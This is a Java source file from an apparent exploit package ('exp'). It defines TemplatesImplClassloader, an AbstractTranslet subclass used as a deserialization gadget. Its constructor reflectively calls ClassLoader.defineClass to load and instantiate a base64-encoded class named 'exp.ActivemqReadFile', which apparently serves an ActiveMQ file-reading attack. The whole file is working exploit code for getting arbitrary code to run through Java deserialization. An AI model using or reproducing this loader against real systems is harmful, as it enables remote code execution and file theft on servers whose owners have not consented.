package exp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


public class TemplatesImplClassloader extends AbstractTranslet {
	public String classname ;
	public String classbase64 ;
    
	
    public void setAll()  {
    	this.classname = "exp.ActivemqReadFile";
    	this.classbase64 = "";
    }
	
    public TemplatesImplClassloader() throws Exception {
    	setAll();
    	try {
    		Class.forName(classname).newInstance();
		} catch (Exception e) {
	    	java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
	        defineClass.setAccessible(true);
			byte [] bs = base64_decode(classbase64);
	        Class clazz = (Class)defineClass.invoke(Thread.currentThread().getContextClassLoader(), classname, bs, 0, bs.length);
	        Object obj = clazz.newInstance();
		}
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
	
    public static byte[] base64_decode(String string) throws Exception {
    	byte[] bytes;
		try {
			try {
				Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
				bytes = (byte[]) Class.forName("java.util.Base64$Decoder").getMethod("decode",String.class).invoke(decoder, string);
			} catch (Exception e) {
				Object decoder = Class.forName("java.util.Base64").getMethod("getMimeDecoder").invoke(null);
				bytes = (byte[]) Class.forName("java.util.Base64$Decoder").getMethod("decode",String.class).invoke(decoder, string);
			}
		} catch (Exception e) {
			bytes = (byte[]) Class.forName("sun.misc.BASE64Decoder").getMethod("decodeBuffer",String.class).invoke(Class.forName("sun.misc.BASE64Decoder").newInstance(), string);
		}
		return bytes;
	}
}
